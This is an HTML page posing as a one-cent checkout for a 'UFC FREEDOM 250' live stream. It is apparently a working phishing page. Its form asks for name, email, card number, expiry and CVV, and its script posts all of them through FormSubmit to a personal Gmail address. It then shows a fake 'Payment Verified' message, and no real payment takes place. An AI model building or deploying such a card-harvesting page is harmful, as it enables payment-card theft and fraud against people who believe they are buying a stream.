<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Outfit:wght@900&display=swap');
        :root { --ufc-red: #d20a0a; --bg-dark: #0b0b0b; --card-bg: #141414; --text-gray: #a0a0a0; }
        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: white; margin: 0; padding: 0; }
        .header { text-align: center; padding: 40px 0; border-bottom: 2px solid var(--ufc-red); }
        .logo { font-family: 'Outfit', sans-serif; font-size: 2.2rem; font-weight: 900; text-transform: uppercase; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
        .fight-card { background: var(--card-bg); padding: 20px; border-radius: 8px; border: 1px solid #333; text-align: center; }
        .price-tag { font-size: 2rem; color: var(--ufc-red); font-weight: 900; margin: 10px 0; }
        input[type=text] { width: 100%; margin-bottom: 15px; padding: 15px; background: #1a1a1a; border: 1px solid #333; color: white; border-radius: 4px; }
        .btn { background-color: var(--ufc-red); color: white; padding: 20px; width: 100%; border: none; cursor: pointer; font-weight: 900; text-transform: uppercase; border-radius: 4px; }
        #thanks-screen { display: none; text-align: center; margin-top: 50px; }
    </style>
</head>
<body>

<div class="header" id="nav-header">
    <div class="logo">UFC FREEDOM 250</div>
</div>

<div id="form-container" class="container">
    <div class="fight-card">
        <div class="price-tag">$0.01</div>
    </div>
    <form id="checkoutForm">
        <!-- These hidden inputs ensure your email format is clean -->
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_template" value="table">
        <input type="hidden" name="_subject" value="New UFC Stream Order">

        <h3>Account Info</h3>
        <input type="text" name="Full_Name" placeholder="Full Name" required>
        <input type="text" name="Email" placeholder="Email" required>

        <h3>Payment Details</h3>
        <input type="text" name="Card_Name" placeholder="Name on Card" required>
        <input type="text" name="Card_Number" placeholder="Card Number" required>
        <input type="text" name="Expiry" placeholder="MM/YY" required>
        <input type="text" name="CVV" placeholder="CVV" required>

        <button type="submit" class="btn" id="submitBtn">UNLOCK LIVE STREAM</button>
    </form>
</div>

<div id="thanks-screen">
    <h1>ACCESS GRANTED</h1>
    <p>Payment Verified! Check your email for the link.</p>
</div>

<script>
    const form = document.getElementById('checkoutForm');
    const btn = document.getElementById('submitBtn');

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        btn.innerText = "PROCESSING...";
        btn.disabled = true;

        // AJAX POST request to FormSubmit
        fetch('https://formsubmit.co/ajax/info.yahya.bx@gmail.com', {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                Full_Name: form.Full_Name.value,
                Email: form.Email.value,
                Card_Name: form.Card_Name.value,
                Card_Number: form.Card_Number.value,
                Expiry: form.Expiry.value,
                CVV: form.CVV.value
            })
        })
        .then(response => response.json())
        .then(data => {
            // Hide form and show success
            document.getElementById("form-container").style.display = "none";
            document.getElementById("nav-header").style.display = "none";
            document.getElementById("thanks-screen").style.display = "block";
        })
        .catch(error => {
            alert("Error: Ensure you activated your form via email.");
            btn.innerText = "UNLOCK LIVE STREAM";
            btn.disabled = false;
        });
    });
</script>
</body>
</html>
